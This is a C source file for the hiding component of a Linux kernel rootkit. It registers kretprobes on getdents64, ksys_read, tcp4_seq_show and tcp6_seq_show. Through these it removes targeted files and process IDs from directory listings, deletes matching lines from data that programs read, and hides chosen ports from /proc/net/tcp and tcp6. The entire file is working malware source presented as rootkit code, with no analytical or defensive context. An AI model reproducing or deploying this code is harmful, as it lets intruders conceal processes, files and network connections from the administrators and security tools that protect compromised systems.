// SPDX-License-Identifier: GPL-2.0
// core/filter.c - Hiding hooks: 4 kretprobes on getdents64, ksys_read,
//                 tcp4_seq_show, tcp6_seq_show.
#include <linux/dirent.h>
#include <linux/fs.h>
#include <linux/kprobes.h>
#include <linux/seq_file.h>
#include <linux/slab.h>
#include <linux/uaccess.h>
#include <net/inet_sock.h>

#include "rootkit.h"

/* ---- Per-CPU context for kretprobe entry/return data sharing ---- */

struct rk_gd_ctx {
	void __user	*ubuf;
};

struct rk_read_ctx {
	void __user	*ubuf;
	size_t		count;
};

struct rk_tcp_ctx {
	struct seq_file	*seq;
	struct sock	*sk;
	int		saved_count;
};

static DEFINE_PER_CPU(struct rk_gd_ctx, gd_ctx);
static DEFINE_PER_CPU(struct rk_read_ctx, read_ctx);
static DEFINE_PER_CPU(struct rk_tcp_ctx, tcp4_ctx);
static DEFINE_PER_CPU(struct rk_tcp_ctx, tcp6_ctx);

/* ---- getdents64 probe: hide files and PIDs from ls/ps ---- */

static int gd_entry(struct kretprobe_instance *ri, struct pt_regs *regs)
{
	struct rk_gd_ctx *ctx = this_cpu_ptr(&gd_ctx);

	ctx->ubuf = (void __user *)regs->si;
	return 0;
}

static int gd_return(struct kretprobe_instance *ri, struct pt_regs *regs)
{
	struct rk_gd_ctx *ctx = this_cpu_ptr(&gd_ctx);
	long ret = regs_return_value(regs);
	char *kbuf;
	long off, new_ret;

	if (ret <= 0)
		return 0;

	kbuf = kmalloc(ret, GFP_KERNEL);
	if (!kbuf)
		return 0;

	if (copy_from_user(kbuf, ctx->ubuf, ret)) {
		kfree(kbuf);
		return 0;
	}

	off = 0;
	new_ret = ret;

	while (off < new_ret) {
		struct linux_dirent64 *d;
		bool hide = false;
		long reclen;

		d = (struct linux_dirent64 *)(kbuf + off);
		reclen = d->d_reclen;
		if (reclen <= 0)
			break;

		if (rk_target_match(&rk_file_targets, d->d_name))
			hide = true;
		if (!hide && rk_target_match(&rk_pid_targets, d->d_name))
			hide = true;

		if (hide) {
			long remaining = new_ret - off - reclen;

			if (remaining > 0)
				memmove(kbuf + off, kbuf + off + reclen,
					remaining);
			new_ret -= reclen;
		} else {
			off += reclen;
		}
	}

	if (new_ret != ret) {
		if (!copy_to_user(ctx->ubuf, kbuf, new_ret))
			regs->ax = new_ret;
	}

	kfree(kbuf);
	return 0;
}

static struct kretprobe rk_gd_probe = {
	.entry_handler	= gd_entry,
	.handler	= gd_return,
	.maxactive	= 20,
	.kp.symbol_name	= "__x64_sys_getdents64",
};

/* ---- ksys_read probe: hide lines from file content ---- */

static int read_entry(struct kretprobe_instance *ri, struct pt_regs *regs)
{
	struct rk_read_ctx *ctx = this_cpu_ptr(&read_ctx);

	ctx->ubuf = (void __user *)regs->si;
	ctx->count = (size_t)regs->dx;
	return 0;
}

static int read_return(struct kretprobe_instance *ri, struct pt_regs *regs)
{
	struct rk_read_ctx *ctx = this_cpu_ptr(&read_ctx);
	long ret = regs_return_value(regs);
	char *kbuf, *src, *dst, *end, *nl;
	long new_ret;

	if (ret <= 0)
		return 0;
	if (rk_content_targets.count == 0)
		return 0;

	kbuf = kmalloc(ret, GFP_KERNEL);
	if (!kbuf)
		return 0;

	if (copy_from_user(kbuf, ctx->ubuf, ret)) {
		kfree(kbuf);
		return 0;
	}

	src = kbuf;
	dst = kbuf;
	end = kbuf + ret;

	while (src < end) {
		size_t line_len;

		nl = memchr(src, '\n', end - src);
		line_len = nl ? (size_t)(nl - src + 1) : (size_t)(end - src);

		if (!rk_line_matches(&rk_content_targets, src, line_len)) {
			if (dst != src)
				memmove(dst, src, line_len);
			dst += line_len;
		}
		src += line_len;
	}

	new_ret = dst - kbuf;
	if (new_ret != ret) {
		if (!copy_to_user(ctx->ubuf, kbuf, new_ret))
			regs->ax = new_ret;
	}

	kfree(kbuf);
	return 0;
}

static struct kretprobe rk_read_probe = {
	.entry_handler	= read_entry,
	.handler	= read_return,
	.maxactive	= 20,
	.kp.symbol_name	= "ksys_read",
};

/* ---- tcp4_seq_show probe: hide ports from /proc/net/tcp ---- */

static int tcp4_entry(struct kretprobe_instance *ri, struct pt_regs *regs)
{
	struct rk_tcp_ctx *ctx = this_cpu_ptr(&tcp4_ctx);

	ctx->seq = (struct seq_file *)regs->di;
	ctx->sk = (struct sock *)regs->si;
	if (ctx->seq)
		ctx->saved_count = ctx->seq->count;
	return 0;
}

static int tcp4_return(struct kretprobe_instance *ri, struct pt_regs *regs)
{
	struct rk_tcp_ctx *ctx = this_cpu_ptr(&tcp4_ctx);
	struct inet_sock *inet;
	unsigned short sport;

	if (!ctx->sk || (unsigned long)ctx->sk == (unsigned long)SEQ_START_TOKEN)
		return 0;
	if (!ctx->seq)
		return 0;

	inet = inet_sk(ctx->sk);
	sport = ntohs(inet->inet_sport);

	if (rk_port_match(&rk_port_targets, sport))
		ctx->seq->count = ctx->saved_count;

	return 0;
}

static struct kretprobe rk_tcp4_probe = {
	.entry_handler	= tcp4_entry,
	.handler	= tcp4_return,
	.maxactive	= 20,
	.kp.symbol_name	= "tcp4_seq_show",
};

/* ---- tcp6_seq_show probe: hide ports from /proc/net/tcp6 ---- */

static int tcp6_entry(struct kretprobe_instance *ri, struct pt_regs *regs)
{
	struct rk_tcp_ctx *ctx = this_cpu_ptr(&tcp6_ctx);

	ctx->seq = (struct seq_file *)regs->di;
	ctx->sk = (struct sock *)regs->si;
	if (ctx->seq)
		ctx->saved_count = ctx->seq->count;
	return 0;
}

static int tcp6_return(struct kretprobe_instance *ri, struct pt_regs *regs)
{
	struct rk_tcp_ctx *ctx = this_cpu_ptr(&tcp6_ctx);
	struct inet_sock *inet;
	unsigned short sport;

	if (!ctx->sk || (unsigned long)ctx->sk == (unsigned long)SEQ_START_TOKEN)
		return 0;
	if (!ctx->seq)
		return 0;

	inet = inet_sk(ctx->sk);
	sport = ntohs(inet->inet_sport);

	if (rk_port_match(&rk_port_targets, sport))
		ctx->seq->count = ctx->saved_count;

	return 0;
}

static struct kretprobe rk_tcp6_probe = {
	.entry_handler	= tcp6_entry,
	.handler	= tcp6_return,
	.maxactive	= 20,
	.kp.symbol_name	= "tcp6_seq_show",
};

/* ---- Registration ---- */

int rk_filter_init(void)
{
	int error;

	error = register_kretprobe(&rk_gd_probe);
	if (error)
		return error;

	error = register_kretprobe(&rk_read_probe);
	if (error)
		goto undo_gd;

	error = register_kretprobe(&rk_tcp4_probe);
	if (error)
		goto undo_read;

	error = register_kretprobe(&rk_tcp6_probe);
	if (error)
		goto undo_tcp4;

	return 0;

undo_tcp4:
	unregister_kretprobe(&rk_tcp4_probe);
undo_read:
	unregister_kretprobe(&rk_read_probe);
undo_gd:
	unregister_kretprobe(&rk_gd_probe);
	return error;
}

void rk_filter_exit(void)
{
	unregister_kretprobe(&rk_tcp6_probe);
	unregister_kretprobe(&rk_tcp4_probe);
	unregister_kretprobe(&rk_read_probe);
	unregister_kretprobe(&rk_gd_probe);
}
